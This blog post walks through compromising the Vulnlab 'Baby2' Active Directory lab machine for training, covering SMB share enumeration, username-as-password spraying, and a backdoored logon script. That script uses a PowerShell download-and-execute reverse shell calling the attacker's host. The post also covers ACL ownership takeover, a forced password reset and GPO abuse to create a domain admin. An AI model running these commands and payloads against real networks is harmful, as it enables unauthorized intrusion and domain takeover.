---
title: Baby2 - Vulnlab
date: 2024-06-05 16:06:39
tags: [vulnlab, Medium]
categories: vulnlab
keywords: 'Vulnlab, Medium, Windows'
description: This machine was really interesting to get into, as I learned how to practically implement backdoors onto a compromised host as well as GPO abuses and general vulnerability testing in domain accounts. Props to xct for creating this machine.
cover: /images/vulnlab/baby2-vl/baby2_slide.png
top_img: /images/cyberpunk-red.jpg
toc: true
toc_number: false
---

This machine was really interesting to get into, as I learned how to practically implement backdoors onto a compromised host as well as GPO abuses and general vulnerability testing in domain accounts. Props to xct for creating this machine.

# Enumeration

Let's start with a general NMAP scan of the machine.

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 21:04 EDT
Nmap scan report for 10.10.102.12
Host is up (0.11s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
57294/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 19.46 seconds
```

I also did a bit of more in-depth scans into the different ports with `-A` and found the DNS name for the machine denoted as `dc.baby2.vl`.

This box seems to have similar ports to the original `Baby` machine, which was an Easy machine that I've done before. Since there isn't a webserver, let's see if there's anything we can find initially with SMB.
`smbclient -L 10.10.102.12 -N`

This will enumerate all of the SMB shares if we can see them by authenticating with null credentials.

```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	apps            Disk      
	C$              Disk      Default share
	docs            Disk      
	homes           Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share
```

You'll see that there are around three shares that are not usually on here - being `apps`, `docs`, and `homes`. This is inherently already a vulnerability, as I should not be allowed to view these shares by default with null credentials. Let's take a look into the `homes` directory to start, as the way it sounds this could be the home directories of a few users.
`smbclient \\\\10.10.102.12\\homes -N`

In the directory that we land in, you'll find a list of users and (what we can assume) are their home directories. This is great because we already now have a wordlist to test around with LDAP.

```
smb: \> ls
  .                                   D        0  Sat Sep  2 10:45:25 2023
  ..                                  D        0  Tue Aug 22 16:10:21 2023
  Amelia.Griffiths                    D        0  Tue Aug 22 16:17:06 2023
  Carl.Moore                          D        0  Tue Aug 22 16:17:06 2023
  Harry.Shaw                          D        0  Tue Aug 22 16:17:06 2023
  Joan.Jennings                       D        0  Tue Aug 22 16:17:06 2023
  Joel.Hurst                          D        0  Tue Aug 22 16:17:06 2023
  Kieran.Mitchell                     D        0  Tue Aug 22 16:17:06 2023
  library                             D        0  Tue Aug 22 16:22:47 2023
  Lynda.Bailey                        D        0  Tue Aug 22 16:17:06 2023
  Mohammed.Harris                     D        0  Tue Aug 22 16:17:06 2023
  Nicola.Lamb                         D        0  Tue Aug 22 16:17:06 2023
  Ryan.Jenkins                        D        0  Tue Aug 22 16:17:06 2023

		6126847 blocks of size 4096. 2005567 blocks available
```

I made a one-liner that should take all of these usernames from the SMB session and convert it into a list of usernames.
`smbclient -c 'ls' \\\\10.10.102.12\\homes -N | awk '{print $1}' | grep [A-Za-z] > ul.txt`

With our list of usernames, let's test to see if any of these users are vulnerable to Kerberoasting or ASREPRoasting. We'll try and use the `Guest` user with no credentials since we don't currently have any valid passwords.
`impacket-GetNPUsers -dc-ip 10.10.102.12 -dc-host dc.baby.vl -usersfile ul.txt -request -no-pass BABY2/'Guest'`
`impacket-GetUserSPNs -dc-ip 10.10.102.12 -dc-host dc.baby.vl -usersfile ul.txt BABY2/'Guest' -no-pass`

Unfortunately, neither seem to produce any valid results.

# Credential Reusage

Another test that I learned how to do in one of the previous HTB machines that I practiced against is testing for username/password reusage - which is essentially just seeing if users are using their username as their password. This is generally the case when testing OT infrastructure, however let's give it a try here.

We can use crackmapexec for the feature along with the user list that we already have. I also added another one-liner for ease-of-use.
`for user in $(cat ul.txt); do crackmapexec smb 10.10.102.12 -u $user -p $(echo $user | tr '[:upper:]' '[:lower:]'); done`

The format that the above command references will return any valid credentials with credential reusage, ex: 'Amelia.Griffiths:amelia.griffiths'.

```
SMB         10.10.102.12    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
SMB         10.10.102.12    445    DC               [+] baby2.vl\library:library
```

This confirms that the `library` user is using the same string for both their username and password.

Now that we have credentials, let's see if we can access any of the other SMB shares such as `docs` or `apps`. We'll try `apps` first just to be sure.

`smbclient \\\\10.10.102.12\\apps -U 'library'`
There seems to be a folder in this share denoted as `dev`, we'll access it with `cd dev`

```
smb: \dev\> ls
  .                                   D        0  Thu Sep  7 15:13:50 2023
  ..                                  D        0  Thu Sep  7 15:12:59 2023
  CHANGELOG                           A      108  Thu Sep  7 15:16:15 2023
  login.vbs.lnk                       A     1800  Thu Sep  7 15:13:23 2023

		6126847 blocks of size 4096. 2003374 blocks available
```

Let's grab both of these with `mget *` to see what they have. I'm not as interested in the CHANGELOG, more so in the VBS shortcut.

# Logon Script Exploitation

Upon opening the `login.vbs.lnk` shortcut on our local machine, we can see that most of the file is encrypted, however there are some valid strings that point us to another share.
`\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs`

We also find the SID of the domain `S-1-5-21-213243958-1766259620-4276976267`

Let's access the file and see if there's anything we can find.
`smbclient \\\\10.10.102.12\\SYSVOL -U 'library'`

The `login.vbs` file is within `\baby2.vl\scripts\`.

```
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")    
  
    [...snip...]
    
    Set objNetwork = Nothing
End Sub

MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"
```

This script looks to be mapping the network drives within the SMB instance, at least from first glance. You can see at the end that the SMB shares `apps` and `docs` are being mapped to `V` and `L` respectively. If this script is a login script that is ran when a user logs in, then we can potentially alter this to give us a reverse shell on the users machine once they log in.

However what we know now is not enough to justify this, so let's check to see if bloodhound supports our thought process. I'll link the same bloodhound materials that I normally use for domain object enumeration.
[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux)
[https://github.com/dirkjanm/BloodHound.py](https://github.com/dirkjanm/BloodHound.py)

We'll run the python ingestor to dump the LDAP instance and all of its domain objects to a compressed zip archive.
`python3 BloodHound.py/bloodhound.py -d 'baby2.vl' -u 'library' -p 'library' -c all -ns 10.10.102.12 --zip`

Once we receive the archive, we can upload it to Bloodhound using the `Upload Data` function.

Let's look at our `library` user node to see if there are any login scripts that might correspond with the same `login.vbs` file that we saw prior.

![](/images/vulnlab/baby2-vl/c.jpg)

There doesn't seem to be anything noteworthy here, however let's check to see if any other users from our user list have any login scripts present - we'll start with `Amelia.Griffiths`.

![](/images/vulnlab/baby2-vl/d.jpg)

We can see here that this user does have a login script enabled, which points to the same `login.vbs` file within the `SYSVOL` share that we saw earlier. Now that we have this information, the attack path is relatively clear. All that we need to do is modify this file to include a reverse shell and wait for any users to login (that have the same properties as Amelia Griffiths, or Amelia Griffiths themself).

In a red-team environment, we would just need to wait for the user log-in. This would just require some patience and could take a day or two, whenever the user next attempts to access their workstation. However since we're in a lab, I'm assuming that there's a scheduled task or automated login that logs a user in after a short period of time.

So let's modify the script. I've included to resources below, a simple PowerShell reverse shell within a text file and a line of text that will trigger this reverse shell within `login.vbs`

```
CreateObject("WScript.Shell").Run "powershell -ep bypass -w hidden IEX (New-Object System.Net.Webclient).DownloadString('http://10.8.0.173:9001/revshell.txt')"
```

You can add this anywhere in the `login.vbs` script, I just opted to do it before the SMB shares are mapped at the bottom of the file.

Next, we'll make sure that the PowerShell reverse shell that I've generated is within the same directory that we'll be hosting, remember that it's name is `revshell.txt` and the LPORT for it is `9002`, which will point to a netcat listener.

```
$LHOST = "10.8.0.173"; $LPORT = 9002; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = [...snip...]$StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

You can generate a similar one from [revshells.com](https://www.revshells.com/), that's essentially all you'll need.

So now all that's left to do is to delete the existing `login.vbs` script is `SYSVOL` and add our modified script to it.

We'll also stand up two listeners, one being a Python HTTP server and another being a netcat listener.
`python3 -m http.server 9001`
`nc -lvnp 9002`

`smbclient -c 'cd \baby2.vl\scripts\; rm login.vbs; put login.vbs' \\\\10.10.102.12\\SYSVOL -U 'library'`

After about a minute or two of waiting, we can see that our file was grabbed by the remote machine from our webserver.
`10.10.102.12 - - [21/May/2024 14:16:02] "GET /revshell.txt HTTP/1.1" 200 -`

And we can also see that our reverse shell was executed, and we now have a shell as `amelia.griffiths`.

![](/images/vulnlab/baby2-vl/e.jpg)

# Host Reconnaissance

The user flag was not in it's ordinary location, which usually is `C:\Users\(user)\Desktop\user.txt`, however I found that it was just within the root `C:\` drive denoted as `C:\users.txt`. This means we have conquered the first half of the machine!

From here I decided to stand up a Sliver server and ran an implant so I could get an easier shell, since the shell that we landed with is very barebones. I've done this before in a few of my other writeups - essentially all I'm doing is starting a listener, generate an implant, and running the implant on the remote machine to receive a session. You can find all the documentation needed to do the above steps [here](https://github.com/BishopFox/sliver).

So from here we'll need to move around the domain using our permissions. I couldn't find specifically anything that `Amelia.Griffiths` could do from Bloodhound, nor did their permissions seem to be out of the ordinary.

However you'll notice that if you run `whoami /all` with our user, you'll find that they are a part of two groups that are not regularly enabled by default.

```
BABY2\office    Group            S-1-5-21-213243958-1766259620-4276976267-1104 Mandatory group, Enabled by default, Enabled group
BABY2\legacy    Group            S-1-5-21-213243958-1766259620-4276976267-2601 Mandatory group, Enabled by default, Enabled group
```

We can look at both the groups in Bloodhound to see if they have any abnormally configured outbound object controls. The office group didn't seem to have anything out of the ordinary, however the focal point for our attack path seems to rely on two of the outbound object controls that the `legacy` group has.

![](/images/vulnlab/baby2-vl/f.jpg)

# GPO Object Control

It seems that `Amelia.Griffiths` (who is within the `legacy` group) has `WriteOwner` on both the GPO-Management OU and the `gpoadm` user. To give context on how this works, `WriteOwner` essentially allows our user to modify the ownership of the object. If we can change the ownership of this object, then we can make the owner of it ourselves. And from there, our ability to abuse the GPOs can allow us to add a new DA of our choosing.

Furthermore, we can see that the `gpoadm` user has GenericAll on two GPOs that we can use to create said DAs.

![](/images/vulnlab/baby2-vl/g.jpg)

Not only that, but if we verify who the `gpoadm` account belongs to by running the below command, we can see that it is controlled by the Domain Admins group.

```
PS C:\Users\amelia.griffiths\Desktop> Get-ADUser gpoadm | ForEach-Object {Get-ACL "AD:\$($_.DistinguishedName)" | Select-Object -ExpandProperty Owner}

BABY2\Domain Admins
```

So to start, let's use `PowerView` to change the owner of the `gpoadm` user to `Amelia.Griffiths` using a built-in cmdlet.
`PS C:\Users\amelia.griffiths\Desktop> Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths`

If we run the above `Get-ADUser` command that we ran earlier, we can see that the owner of the `gpoadm` account has been changed.

```
PS C:\Users\amelia.griffiths\Desktop> Get-ADUser gpoadm | ForEach-Object {Get-ACL "AD:\$($_.DistinguishedName)" | Select-Object -ExpandProperty Owner}

BABY2\Amelia.Griffiths
```

Afterwards, we can then add a new ruleset, or ACL, to the `gpoadm` user to give ourselves GenericAll on the account.
`PS C:\Users\amelia.griffiths\Desktop> Add-DomainObjectACL -PrincipalIdentity Amelia.Griffiths -TargetIdentity gpoadm -Rights All`

This in theory should now allow for us to do a multitude of different attacks, most notably changing the users password. While I normally wouldn't do this in a red-team environment, this should be alright since we're in a lab.

That being said, if you do want a little pointer on what you could do that could help keep a low-profile, make sure to check out xct's writeup on this machine [here](https://www.youtube.com/watch?v=a97PMfOXitY&t=788s&ab_channel=vulnlab) (timestamp is 9:08). He utilizes Whisker and Rubeus to create a TGT that essentially acts like a backdoor, allowing you to create shadow credentials that you can use to always be able to log into the box. This can continue to work even if the user changes their password and does NOT change the user's password.

Not only that, you can also use the dumped hash that Rubeus will provide in PTH (Pass-the-Hash).

We could reupload a new Bloodhound dump, but I already know that we have GenericAll on this user. We'd normally be able to use `bloodyAD` to change the user's passwords, but that requires us to have valid credentials to `Amelia.Griffiths`, which we don't have.

Luckily enough there is a Window alternative that we can do within our shell as `Amelia.Griffiths`.

```
PS C:\Users\amelia.griffiths\Desktop> $newcred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

PS C:\Users\amelia.griffiths\Desktop> Set-DomainUserPassword gpoadm -AccountPassword $cred
```

There was no error output, thus we can confirm that the user password for `gpoadm` has been successfully changed. We can verify this in crackmapexec, but to prevent clutter on the writeup I'll just show a quick screenshot of it.

![](/images/vulnlab/baby2-vl/h.jpg)

# GPO Abuse as gpoadm

Now, we should be able to abuse either of the two GPOs that `gpoadm` has control over. We can verify these two GPOs that we saw in our Bloodhound output by running the `Get-GPO` cmdlet in `PowerView`.
`PS C:\Users\amelia.griffiths\Desktop> Get-GPO -all`

This should return both GPOs that we saw previously, the `Default Domain Policy` and the `Default Domain Controllers Policy`.
It doesn't really matter which one we try to abuse, so I'll use the `Default Domain Controllers Policy`.

We can use `pyGPOAbuse` to essentially automate the exploitation of this GPO. What this tool will do is modify the GPO to create a scheduled task and execute a respective command that will give us a DA to authenticate as. https://github.com/Hackndo/pyGPOAbuse

By default, `pyGPOAbuse` will create a user under the context of `john:H4x00r123..`, we can also opt to specify a command to be more silent however this is all we'll probably need for this lab.
`python3 pyGPOAbuse/pygpoabuse.py -dc-ip 10.10.104.215 -gpo-id "6ac1786c-016f-11d2-945f-00c04fb984f9" baby2.vl/gpoadm:'Password123!'`

This should create the scheduled task, which will potentially take a while to run.
We can circumvent this by forcing the GPO service to restart by running `gpupdate /force`.

Now we can test our credentials that the GPO abuse created for us, being `john:H4x00r123..`
`crackmapexec winrm 10.10.104.215 -u 'john' -p 'H4x00r123..'`

![](/images/vulnlab/baby2-vl/i.jpg)

Thus, if we log into the WinRM service using `evil-winrm`, we should be able to authenticate properly.
`evil-winrm -i 10.10.104.215 -u 'john' -p 'H4x00r123..'`

![](/images/vulnlab/baby2-vl/j.jpg)

We can now see that we DA privileges since we have all of the permissions listed within `whoami /priv`.
This allows us to read the contents of the Administrator directory and read the root flag, meaning we have completed this machine!

The root flag is within `C:\Users\Administrator\Desktop\root.txt`.

# Conclusion

I plan on also making a research post about GPO abuse and getting into the nitty gritties of how to exploit it manually rather than doing it through `pyGPOAbuse`, which from what I'm expecting will probably be through `RPCClient`. Though I could be wrong. Nonetheless again, big thanks to xct for creating this machine - it definitely helped with a lot of practice and hopefully this writeup did the same for any readers.

# Resources

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux
https://github.com/dirkjanm/BloodHound.py
https://www.revshells.com/
https://github.com/BishopFox/sliver
https://www.youtube.com/watch?v=a97PMfOXitY&t=788s&ab_channel=vulnlab
https://github.com/Hackndo/pyGPOAbuse